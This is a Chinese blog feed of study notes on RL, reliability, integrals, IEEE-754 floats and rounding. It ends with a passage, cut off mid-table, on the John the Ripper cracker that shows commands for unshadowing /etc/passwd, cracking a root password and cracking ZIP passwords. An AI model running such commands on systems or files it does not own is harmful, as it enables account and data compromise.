inline">\(s'\)</span>后收到的即时奖励（或预期的即时奖励)。</li></ul><p>状态和行动空间可能是有限的，也可能是无限的。一些具有可数无限状态和行动空间的过程可以简化为具有有限状态和行动空间的过程。</p><p>策略函数 <span class="math inline">\(\pi\)</span> 是从状态空间（<span class="math inline">\(S\)</span> ）到动作空间（ <span class="math inline">\(A\)</span> ）的（潜在概率)映射。</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> ML </tag>
            
            <tag> RL </tag>
            
            <tag> 强化学习 </tag>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>容错、高可用和灾备</title>
      <link href="/2021/11/21/rong-cuo-gao-ke-yong-he-zai-bei/"/>
      <url>/2021/11/21/rong-cuo-gao-ke-yong-he-zai-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="容错高可用和灾备">容错，高可用和灾备</h1><p>标题里面的三个术语，很容易混淆，专业人员有时也会用错。</p><p>本文就用图片解释它们有何区别。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.wangbase.com/blogimg/asset/201911/bg2019111705.jpg"></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.wangbase.com/blogimg/asset/201911/bg2019111706.jpg"></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.wangbase.com/blogimg/asset/201911/bg2019111707.jpg"></p><h2 id="容错">容错</h2><p><a href="https://en.wikipedia.org/wiki/Fault_tolerance">容错</a>（faulttolerance）指的是， <strong>发生故障时，系统还能继续运行。</strong></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.wangbase.com/blogimg/asset/201911/bg2019111708.jpg"></p><p>飞机有四个引擎，如果一个引擎坏了，剩下三个引擎，还能继续飞，这就是"容错"。同样的，汽车的一个轮子扎破了，剩下三个轮子，也还是勉强能行驶。</p><p>容错的目的是，发生故障时，系统的运行水平可能有所下降，但是依然可用，不会完全失败。</p><h2 id="高可用">高可用</h2><p><a href="https://en.wikipedia.org/wiki/High_availability">高可用</a>（highavailability）指的是，<strong>系统能够比正常时间更久地保持一定的运行水平。</strong></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.wangbase.com/blogimg/asset/201911/bg2019111709.jpg"></p><p>汽车的备胎就是一个高可用的例子。如果没有备胎，轮胎坏了，车就开不久了。备胎延长了汽车行驶的可用时间。</p><p>注意，高可用不是指系统不中断（那是容错能力），而是指一旦中断能够快速恢复，即中断必须是短暂的。如果需要很长时间才能恢复可用性，就不叫高可用了。上面例子中，更换备胎就必须停车，但只要装上去，就能回到行驶状态。</p><h2 id="灾备">灾备</h2><p><a href="https://en.wikipedia.org/wiki/Disaster_recovery">灾备</a>（又称灾难恢复，disasterrecovery）指的是， <strong>发生灾难时恢复业务的能力。</strong></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.wangbase.com/blogimg/asset/201911/bg2019111710.jpg"></p><p>上图中，飞机是你的 IT基础设施，飞行员是你的业务，飞行员弹射装置就是灾备措施。一旦飞机即将坠毁，你的基础设施就要没了，灾备可以让你的业务幸存下来。</p><p>灾备的目的就是，保存系统的核心部分。一个好的灾备方案，就是从失败的基础设施中获取企业最宝贵的数据，然后在新的基础设施上恢复它们。注意，灾备不是为了挽救基础设置，而是为了挽救业务。</p><h2 id="总结">总结</h2><p>上面三个方面可以结合起来，设计一个可靠的系统。</p><blockquote><ul><li>容错：发生故障时，如何让系统继续运行。</li><li>高可用：系统中断时，如何尽快恢复。</li><li>灾备：系统毁灭时，如何抢救数据。</li></ul></blockquote><h2 id="参考文献">参考文献</h2><ul><li><a href="http://www.pbenson.net/2014/02/the-difference-between-fault-tolerance-high-availability-disaster-recovery/">TheDifference Between Fault Tolerance, High Availability, &amp; DisasterRecovery</a> , Patrick Benson</li></ul><blockquote><p>引用信息：</p><p>原文作者： <a href="https://www.ruanyifeng.com/">阮一峰</a></p><p>日期： <a href="https://www.ruanyifeng.com/blog/2019/11/">2019年11月17日</a></p><p>版权声明：自由转载-非商用-非衍生-保持署名（<a href="https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</p><p>发表日期： 2019年11月17日</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不定积分习题</title>
      <link href="/2021/11/19/bu-ding-ji-fen-xi-ti/"/>
      <url>/2021/11/19/bu-ding-ji-fen-xi-ti/</url>
      
        <content type="html"><![CDATA[<ol type="1"><li><span class="math display">\[ \int {\frac{1} { {5x + 3} }dx}\]</span></li><li><span class="math display">\[ \int { {e^{2x + 3} }dx} \]</span></li><li><span class="math display">\[ \int {x{e^{ {x^2} } }dx}\]</span></li><li><span class="math display">\[ \int {x\sqrt {1 - {x^2} } dx}\]</span></li><li><span class="math display">\[ \int {\frac{1} { { {x^2} } }\sin\frac{1} {x}dx} \]</span></li><li><span class="math display">\[ \int {\frac{ { {e^{3\sqrt x } } } } {{\sqrt x } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {x\left( {1 + {x^6} }\right)} }dx} \]</span></li><li><span class="math display">\[ \int {\cos 2xdx} \]</span></li><li><span class="math display">\[ \int {\frac{ {\sin x} } { {\sqrt {5 +\cos x} } }dx} \]</span></li><li><span class="math display">\[ \int { { {\tan }^4}xdx} \]</span></li><li><span class="math display">\[ \int {\frac{ { {e^{2x} } } } { {1 +{e^x} } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {1 + {e^x} } }dx}\]</span></li><li><span class="math display">\[ \int {\frac{1} { {x{ {\ln }^2}x} }dx}\]</span></li><li><span class="math display">\[ \int {\frac{1} { {x\left( {1 + 2\ln x}\right)} }dx} \]</span></li><li><span class="math display">\[ \int_{\frac{\pi } {4} } ^ {\frac{\pi }{3} } {\frac{ {\tan x} } { {\ln (\cos x)} }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { { {a^2} + {x^2} }}dx} \]</span></li></ol><h2 id="当前进度">当前进度</h2><hr><ol type="1"><li><span class="math display">\[ \int {\frac{1} { { {a^2} - {x^2} }}dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {\sqrt { {a^2} -{x^2} } } }dx} \]</span></li><li><span class="math display">\[ \int { { {\sin }^3}xdx} \]</span></li><li><span class="math display">\[ \int { { {\sin }^5}xdx} \]</span></li><li><span class="math display">\[ \int { { {\cos }^3}xdx} \]</span></li><li><span class="math display">\[ \int { { {\sin }^4}xdx} \]</span></li><li><span class="math display">\[ \int { { {\sin }^2}x{ {\cos }^5}xdx}\]</span></li><li><span class="math display">\[ \int {\sec xdx} \]</span></li><li><span class="math display">\[ \int { { {\sec }^3}x} {\tan ^5}xd\]</span></li><li><span class="math display">\[ \int { { {\tan }^5}x{ {\sec }^4}xdx}\]</span></li><li><span class="math display">\[ \int {\frac{ {\ln (\tan x)} } { {\sinx\cos x} }dx} \]</span></li><li><span class="math display">\[ \int {\cos 3x\cos 2xdx} \]</span></li><li><span class="math display">\[ \int {\frac{ {\sin x} } { {1 + \sin x}}dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {\sin 2x\cos x} }dx}\]</span></li><li><span class="math display">\[ \int {\frac{ {\arctan \sqrt x } } {{\sqrt x \left( {1 + x} \right)} }dx} \]</span></li><li><span class="math display">\[ \int {\frac{ {1 + \ln x} } { {2 + {{(x\ln x)}^2} } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{ {2x - 3} } { { {x^2} - 3x+ 1} }dx} \]</span></li><li><span class="math display">\[ \int {\frac{ {x + 1} } { { {x^2} - 3x+ 1} }dx} \]</span></li><li><span class="math display">\[ \int {\frac{ {1 - \ln x} } { { { {(x -\ln x)}^2} } }dx} \]</span></li><li><span class="math display">\[ \int {\sqrt { {a^2} - {x^2} } dx(a&gt; 0)} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {\sqrt { {x^2} -{a^2} } } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {\sqrt { {a^2} +{x^2} } } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {\sqrt x +\sqrt[3]{x} } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { { { {(1 + {x^2})}^2}} }dx} \]</span></li><li><span class="math display">\[ \int {\frac{ {3x + 1} } { {\sqrt {{x^2} + 2x - 5} } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { { {x^2}\sqrt { {x^2}- 1} } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { { {x^6}(1 + {x^2})}}d}  \]</span></li><li><span class="math display">\[ \int {\sqrt {1 + \sqrt x } dx}\]</span></li><li><span class="math display">\[ \int {x\cos xdx} \]</span></li><li><span class="math display">\[ \int { {x^2}\cos xdx} \]</span></li><li><span class="math display">\[ \int {x{e^x}dx} \]</span></li><li><span class="math display">\[ \int { {x^2} {e^x}dx} \]</span></li><li><span class="math display">\[ \int { {x^2} { {\cos }^2}\frac{x}{2}dx} \]</span></li><li><span class="math display">\[ \int {x{ {\tan }^2}xdx} \]</span></li><li><span class="math display">\[ \int {x\ln xdx} \]</span></li><li><span class="math display">\[ \int {\ln xdx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {1 + \cos x} }dx}\]</span></li><li><span class="math display">\[ \int {\frac{1} { {1 + \sin x} }dx}\]</span></li><li><span class="math display">\[ \int {\frac{x} { {4 + {x^4} } }dx}\]</span></li><li><span class="math display">\[ \int {\frac{ { {x^2} + 2} } { { {{\left( {x + 1} \right)}^3} } }dx}C \]</span></li><li><span class="math display">\[ \int {\frac{ { {x^5} } } { {\sqrt {1 -{x^2} } } }dx} \]</span></li><li><span class="math display">\[ \int {\frac{ {\sqrt {x + 1} - 1} } {{\sqrt {x + 1} + 1} }dx} \]</span></li><li><span class="math display">\[ \int {x{ {\left( {1 - 2x}\right)}^{99} }dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {x\ln x\ln (\ln x)}}dx} \]</span></li><li><span class="math display">\[ \int {\frac{ { {x^7} } } { { {x^4} +2} }dx} \]</span></li><li><span class="math display">\[ \int { { {(\arcsin x)}^2}dx}\]</span></li><li><span class="math display">\[ \int { { {\sec }^3}xdx} \]</span></li><li><span class="math display">\[ \int_{\frac{\pi } {4} }^{\frac{\pi }{3} } {\frac{ {\tan x} } { {\ln (\cos x)} }dx} \]</span></li><li><span class="math display">\[ \int_{ - 1}^1 {\frac{1} { {1 + {x^2} }}dx} \]</span></li><li><span class="math display">\[ \int {\frac{1} { {2 + \sin x} }dx}\]</span></li><li><span class="math display">\[ \int_0^\pi {\sqrt { { {\sin }^3}x - {{\sin }^5}x} dx} \]</span></li><li><span class="math display">\[I = \int_0^{\frac{\pi } {2} } {\frac{{\sin \theta } } { {\sin \theta + \cos \theta } }d\theta }\]</span></li><li><span class="math display">\[ \int_0^{\frac{\pi } {2} } { {e^x}\sinxdx} \]</span></li><li><span class="math display">\[ \int {\frac{ { {x^3} } } { { {x^8} -2} }dx} \]</span></li><li><span class="math display">\[ \int {\arctan xdx} \]</span></li><li><span class="math display">\[ \int {\frac{ { {x^{2n - 1} } } } { {{x^n} + 1} }dx} \]</span></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
            <tag> Math </tag>
            
            <tag> Calculus </tag>
            
            <tag> 微积分 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速傅里叶变换(FFT)学习笔记</title>
      <link href="/2021/11/19/kuai-su-fu-li-xie-bian-huan-fft-xue-xi-bi-ji/"/>
      <url>/2021/11/19/kuai-su-fu-li-xie-bian-huan-fft-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初中一道反比例函数题中隐含的线性代数思想</title>
      <link href="/2021/11/17/chu-zhong-yi-dao-fan-bi-li-han-shu-ti-zhong-yin-han-de-xian-xing-dai-shu-si-xiang/"/>
      <url>/2021/11/17/chu-zhong-yi-dao-fan-bi-li-han-shu-ti-zhong-yin-han-de-xian-xing-dai-shu-si-xiang/</url>
      
        <content type="html"><![CDATA[<h2 id="题目">题目</h2><p>点 <span class="math inline">\(A,C\)</span> 在反比例函数 <span class="math inline">\(y = \frac{a}{x}(a &gt; 0)\)</span> 的图象上，点<span class="math inline">\(B,D\)</span> 在反比例函数 <span class="math inline">\(y = \frac{b}{x}(b &gt; 0)\)</span> 的图象上, <span class="math inline">\((a &gt; b &gt; 0)\)</span> , <span class="math inline">\(AB\parallel CD\parallel x\)</span>轴，<span class="math inline">\(AB,CD\)</span>在 <span class="math inline">\(x\)</span> 轴的两侧，<span class="math inline">\(AB=\frac{3}{4}，CD=\frac{3}{2}，AB\)</span> 与<span class="math inline">\(CD\)</span> 的距离为<span class="math inline">\(6\)</span>，则 <span class="math inline">\(a-b\)</span> 的值是？</p><p><a href="https://pic1.zhimg.com/v2-dfa2b2f36ff90b3fffa6b9213ec03984_r.jpg">查看原图</a></p><figure><img src="https://googles.plus/images/loading.gif" data-original="/images/hyperbola_twin.svg" alt="Figure 1"><figcaption aria-hidden="true">Figure 1</figcaption></figure><h3 id="初中的做法">初中的做法</h3><p>初中的我看到这种题非常兴奋，但是很难一下贯通，老师在方法讲述时往往都有所“理所当然”。</p><p>初中时，我们这样做：</p>$$\Large{\left\{ \begin{array}{l}\frac{a}{{{y_1}}} - \frac{b}{{{y_1}}} = \frac{3}{4}\\\frac{b}{{{y_2}}} - \frac{a}{{{y_2}}} = \frac{3}{2}\\\left| {{y_1} - {y_2}} \right| = 6\end{array} \right.}$$<p>一通化简通分，甚是累人。</p><p>现在，我们：</p>$$\Large{\left[ {\begin{array}{*{20}{c}}{\frac{1}{{{y_1}}}}&amp;{ - \frac{1}{{{y_1}}}}\\{\frac{1}{{{y_2}}}}&amp;{ - \frac{1}{{{y_2}}}}\end{array}} \right]\left[ {\begin{array}{*{20}{c}}a\\b\end{array}} \right]{\rm{ = }}\left[ {\begin{array}{*{20}{c}}{\frac{3}{4}}\\{\frac{3}{2}}\end{array}} \right]}\\\\\Large{\Rightarrow(a - b)\left[ {\begin{array}{*{20}{c}}{\frac{1}{{{y_1}}}}\\{\frac{1}{{{y_2}}}}\end{array}} \right] = \left[ {\begin{array}{*{20}{c}}{\frac{3}{4}}\\{\frac{3}{2}}\end{array}} \right]}\\\Large{Here~we~have~| {{y_1} - {y_2}} | = 6}$$<p>这时已经真相大白了。</p><p>我们确定等号左侧向量的方向，再通过标量 <span class="math inline">\(a-b\)</span> 进行缩放就可以了。</p><p>显而易见， <span class="math inline">\(a-b\)</span>有且只有唯一解。</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
            <tag> Math </tag>
            
            <tag> Linear Algebra </tag>
            
            <tag> 线性代数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IEEE-754 学习笔记</title>
      <link href="/2021/11/13/ieee-754-xue-xi-bi-ji/"/>
      <url>/2021/11/13/ieee-754-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<blockquote><p>引自文章<a href="https://www.ruanyifeng.com/blog/2010/06/ieee_floating-point_representation.html">《阮一峰的网络日志-浮点数的二进制表示》</a></p><p>版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证）</p></blockquote><ol type="1"><li></li></ol><p>前几天，有一道例题：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>                            <span class="token comment">/* num是整型变量，设为9 */</span>    <span class="token keyword">float</span> <span class="token operator">*</span>pFloat <span class="token operator">=</span> <span class="token operator">&amp;</span>num<span class="token punctuation">;</span>                   <span class="token comment">/* pFloat表示num的内存地址，但是设为浮点数 */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"num的值为：%d\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">/* 显示num的整型值 */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*pFloat的值为：%f\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>pFloat<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* 显示num的浮点值 */</span>    <span class="token operator">*</span>pFloat <span class="token operator">=</span> <span class="token number">9.0</span><span class="token punctuation">;</span>                          <span class="token comment">/* 将num的值改为浮点数 */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"num的值为：%d\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">/* 显示num的整型值 */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*pFloat的值为：%f\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>pFloat<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* 显示num的浮点值 */</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下：</p><blockquote><p>　　num的值为：<strong>9</strong>　　pFloat的值为：<strong>0.000000</strong>　　num的值为：<strong>1091567616</strong>　　pFloat的值为：<strong>9.000000</strong></p></blockquote><p>我很惊讶，num和*pFloat在内存中明明是同一个数，为什么浮点数和整数的解读结果会差别这么大？</p><p>要理解这个结果，一定要搞懂浮点数在计算机内部的表示方法。我读了一些资料，下面就是我的笔记。</p><ol start="2" type="1"><li></li></ol><p>在讨论浮点数之前，先看一下整数在计算机内部是怎样表示的。</p><p><code>int num=9;</code></p><p>上面这条命令，声明了一个整数变量，类型为<code>int</code>，值为<code>9</code>（二进制写法为<code>1001</code>）。普通的32位计算机，用4个字节表示int变量，所以9就被保存为<code>00000000 00000000 00000000 00001001</code>，写成16进制就是<code>0x00000009</code>。</p><p>那么，我们的问题就简化成：<strong>为什么<code>0x00000009</code>还原成浮点数，就成了<code>0.000000</code>？</strong></p><ol start="3" type="1"><li></li></ol><p>根据国际标准<code>IEEE 754</code>，任意一个二进制浮点数V可以表示成下面的形式：</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://chart.googleapis.com/chart?cht=tx&amp;chl=V%20%3D%20(-1)%5Es%5Ctimes%20M%5Ctimes%202%5EE&amp;chs=45"></p><ul><li>（1）(-1)^s表示符号位，当s=0，V为正数；当s=1，V为负数。</li><li>（2）M表示有效数字，大于等于1，小于2。</li><li>（3）2^E表示指数位。</li></ul><p>举例来说，十进制的5.0，写成二进制是101.0，相当于1.01×2^2。那么，按照上面V的格式，可以得出s=0，M=1.01，E=2。</p><p>十进制的-5.0，写成二进制是-101.0，相当于-1.01×2^2。那么，s=1，M=1.01，E=2。</p><p>IEEE754规定，对于32位的浮点数，最高的1位是符号位s，接着的8位是指数E，剩下的23位为有效数字M。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.ruanyifeng.com/blogimg/asset/201006/bg2010060601.png"></p><p>对于64位的浮点数，最高的1位是符号位S，接着的11位是指数E，剩下的52位为有效数字M。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.ruanyifeng.com/blogimg/asset/201006/bg2010060602.png"></p><ol start="5" type="1"><li></li></ol><p>IEEE 754对有效数字M和指数E，还有一些特别规定。</p><p>前面说过，1≤M&lt;2，也就是说，M可以写成1.xxxxxx的形式，其中xxxxxx表示小数部分。<strong>IEEE754规定，在计算机内部保存M时，默认这个数的第一位总是1，因此可以被舍去，只保存后面的xxxxxx部分。</strong>比如保存1.01的时候，只保存01，等到读取的时候，再把第一位的1加上去。这样做的目的，是节省1位有效数字。以32位浮点数为例，留给M只有23位，将第一位的1舍去以后，等于可以保存24位有效数字。</p><p>至于指数E，情况就比较复杂。</p><p>首先，E为一个无符号整数（unsignedint）。这意味着，如果E为8位，它的取值范围为0<sub>255；如果E为11位，它的取值范围为0</sub>2047。但是，我们知道，科学计数法中的E是可以出现负数的，<strong>所以IEEE754规定，E的真实值必须再减去一个中间数，对于8位的E，这个中间数是127；对于11位的E，这个中间数是1023。</strong></p><p>比如，2^10的E是10，所以保存成32位浮点数时，必须保存成10+127=137，即10001001。</p><p>然后，指数E还可以再分成三种情况：</p><ul><li><p>（1）E不全为0或不全为1。这时，浮点数就采用上面的规则表示，即指数E的计算值减去127（或1023），得到真实值，再将有效数字M前加上第一位的1。</p></li><li><p>（2）E全为0。这时，浮点数的指数E等于1-127（或者1-1023），有效数字M不再加上第一位的1，而是还原为0.xxxxxx的小数。这样做是为了表示±0，以及接近于0的很小的数字。</p></li><li><p>（3）E全为1。这时，如果有效数字M全为0，表示±无穷大（正负取决于符号位s）；如果有效数字M不全为0，表示这个数不是一个数（NaN）。</p></li></ul><ol start="6" type="1"><li></li></ol><p>好了，关于浮点数的表示规则，就说到这里。</p><p>下面，让我们回到一开始的问题：为什么<code>0x00000009</code>还原成浮点数，就成了<code>0.000000</code>？</p><p>首先，将<code>0x00000009</code>拆分，得到第一位符号位<code>s=0</code>，后面8位的指数E=<code>00000000</code>，最后23位的有效数字M=<code>000 0000 0000 0000 0000 1001</code>。</p><p>由于指数E全为0，所以符合上一节的第二种情况。因此，浮点数V就写成：</p><blockquote><p>　　V=(-1)<sup>0×0.00000000000000000001001×2</sup>(-126)=1.001×2^(-146)</p></blockquote><p>显然，V是一个很小的接近于0的正数，所以用十进制小数表示就是0.000000。</p><ol start="7" type="1"><li></li></ol><p>再看例题的第二部分。</p><p><strong>请问浮点数9.0，如何用二进制表示？还原成十进制又是多少？</strong></p><p>首先，浮点数9.0等于二进制的1001.0，即1.001×2^3。</p><p>那么，第一位的符号位s=0，有效数字M等于001后面再加20个0，凑满23位，指数E等于3+127=130，即10000010。</p><p>所以，写成二进制形式，应该是s+E+M，即0 10000010 001 0000 0000 00000000 0000。这个32位的二进制数，还原成十进制，正是1091567616。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四舍六入五成双 —— 一种不同的数值修约规则</title>
      <link href="/2021/11/13/si-she-liu-ru-wu-cheng-shuang-yi-chong-bu-tong-de-shu-zhi-xiu-yue-gui-ze/"/>
      <url>/2021/11/13/si-she-liu-ru-wu-cheng-shuang-yi-chong-bu-tong-de-shu-zhi-xiu-yue-gui-ze/</url>
      
        <content type="html"><![CDATA[<h2 id="四舍六入五成双-一种不同的数值修约规则">四舍六入五成双 ——一种不同的数值修约规则</h2><h3 id="介绍">介绍</h3><p><strong>奇进偶舍</strong>，是一种计数保留法，是一种数值修约规则。从统计学的角度，“奇进偶舍”比“四舍五入”更为精确：在大量运算时，因为舍入后的结果有的变大，有的变小，更使舍入后的结果误差均值趋于零。而不是像四舍五入那样逢五就进位，导致结果偏向大数，使得误差产生积累进而产生系统误差。“奇进偶舍”使测量结果受到舍入误差的影响降到最低。</p><h3 id="具体操作">具体操作</h3><blockquote><p>引自：<a href="https://zh.wikipedia.org/wiki/%E5%A5%87%E9%80%B2%E5%81%B6%E6%8D%A8">Wikipedia</a></p></blockquote><p>其具体要求举例如下（以保留两位小数为例）：</p><ol type="1"><li><p>要求保留位数的后一位如果是4，则舍去。例如5.214保留两位小数为5.21。</p></li><li><p>如果保留位数的后一位如果是6，则进上去。例如5.216保留两位小数为5.22。</p></li><li><p>如果保留位数的后一位如果是5，而且5后面不再有数，要根据应看尾数“5”的前一位决定是舍去还是进入:如果是奇数则进入，如果是偶数则舍去。</p></li><li><p>如果保留位数的后一位如果是5，而且5后面仍有数，则无论奇偶都要进入。</p></li></ol><h4 id="图示">图示</h4><p><img src="https://googles.plus/images/loading.gif" data-original="/images/Nearest_integer.svg"></p><h3 id="为什么要这样做">为什么要这样做</h3><p>在我们使用四舍五入的修约标准时。</p><ul><li><p>$ 1,2,3,4 $ 被舍去</p></li><li><p>$ 5,6,7,8,9 $ 被进位</p></li></ul><p>当输入数据尾数随机分布时，进位数的概率是大于舍去的，这也就导致了最后得到的均值会大于预期。</p><p>所以（银行家）数学家们发明了“四舍六入”，使舍去、进位这两个操作发生几率均等。</p><p>接下来就来到了 <span class="math inline">\(5\)</span>的去留问题，应该舍还是入呢？</p><p>所以有了：</p><p>如果保留位数的后一位如果是5，而且5后面不再有数，要根据<strong>应看尾数“5”的前一位</strong>决定是舍去还是进入:如果是奇数则进入，如果是偶数则舍去。例如：</p><ul><li>5.2<strong>1</strong>5 保留两位小数为 <span class="math inline">\(5.22\)</span></li><li>5.2<strong>2</strong>5 保留两位小数为 <span class="math inline">\(5.22\)</span></li></ul><h3 id="ieee-754标准">IEEE-754标准</h3><p>任何有效数上的运算结果，通常都存放在较长的寄存器中，当结果被放回浮点格式时，必须将多出来的比特丢弃。有多种方法可以用来执行舍入作业，实际上IEEE标准列出4种不同的方法：</p><ul><li><strong>舍入到最接近</strong>：舍入到最接近，在一样接近的情况下偶数优先（TiesToEven，这是默认的舍入方式）：会将结果舍入为最接近且可以表示的值，但是当存在两个数一样接近的时候，则取其中的偶数（在二进制中是以0结尾的）。</li><li><strong>朝 $ {}$方向舍入</strong>：会将结果朝正无限大的方向舍入。</li><li><strong>朝 $ {}$方向舍入</strong>：会将结果朝负无限大的方向舍入。</li><li><strong>朝 <span class="math inline">\(0\)</span>方向舍入</strong>：会将结果朝0的方向舍入。</li></ul><h3 id="四舍六入五成单">四舍六入五成单</h3><p>但是这种舍入方式绝少被用到，仅在例如需要避免 <span class="math inline">\(0.5\)</span> 变成 <span class="math inline">\(0\)</span> 的情况时，会使用它。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>开源的安全令牌-CanoKey</title>
      <link href="/2021/11/13/kai-yuan-de-an-quan-ling-pai-canokey/"/>
      <url>/2021/11/13/kai-yuan-de-an-quan-ling-pai-canokey/</url>
      
        <content type="html"><![CDATA[<h2 id="开源的安全令牌-canokey">开源的安全令牌-CanoKey</h2><h3 id="记一次考试经历">记一次考试经历</h3><p>L3HCTF</p><h3 id="先讲讲yutrikey">先讲讲YutriKey</h3><blockquote><p>YubiKey</p><p><a href="https://zh.wikipedia.org/wiki/YubiKey">YubiKey-Wikipedia</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【笔记】浅析密码爆破工具-John</title>
      <link href="/2021/11/13/qian-xi-mi-ma-bao-po-gong-ju-john/"/>
      <url>/2021/11/13/qian-xi-mi-ma-bao-po-gong-ju-john/</url>
      
        <content type="html"><![CDATA[<p><code>John</code>是一款<code>Kali linux</code>自带的密码破解工具，支持密码本破解。<code>John</code>基于密码本破解root用户开机口令如下图所示，当然重点还是你有靠谱的密码本，否则也是白费力气。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">unshadow /etc/passwd &gt; hash.txtjohn --user=root --wordlist=passwd hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里破解出了作者的<code>root</code>密码是<code>h3ll0</code></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-04d0801bbde3dc833515e87699db02bc_720w.jpg"></p><p>那么如何破解ZIP加密文件呢？道理是一样的，先获得Hash文件，然后再上John工具。</p><p>第一步：<code>zip2john</code>获得中间Hash文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zip2john passwd.zip <span class="token operator">&gt;</span> passwd.hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得hash文件：<code>passwd.hash</code></p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-7347eeab3939de8f13b8a3b600b56f8a_720w.jpg"></p><p>第二步：<code>john</code>破解中间Hash文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john passwd.hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得密码：123456，可以看出来这个密码破解过程来自自带的密码本password.lst，这个里面大约有3000个常用密码，但是如果设置的密码不在这里面，那么就很难破解了，我尝试设置了不在密码本中的密码1993，竟然很久都破解不出来，毕竟也是爆破嘛，非常不推荐使用这种方式来破解ZIP加密文件。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-bf0ffe3cb857a304f1c780b2ca7981e2_720w.jpg"></p><p>破解模式参数--incremental简介[<a href="https://zhuanlan.zhihu.com/p/70386868#ref_1">1]</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">破解模式的具体方法      破解的密码长度       所包含的字符Incremental:all         <span class="token number">0</span>-8                  All <span class="token number">95</span> printable ASCII charactersIncremental:all15       <span class="token number">0</span>-5                  All <span class="token number">95</span> printable ASCII charactersIncremental:all6        <span class="token number">6</span>                    All <span class="token number">95</span> printable ASCII charactersIncremental:all7        <span class="token number">7</span>                    All <span class="token number">95</span> printable ASCII charactersIncremental:all8        <span class="token number">8</span>                    All 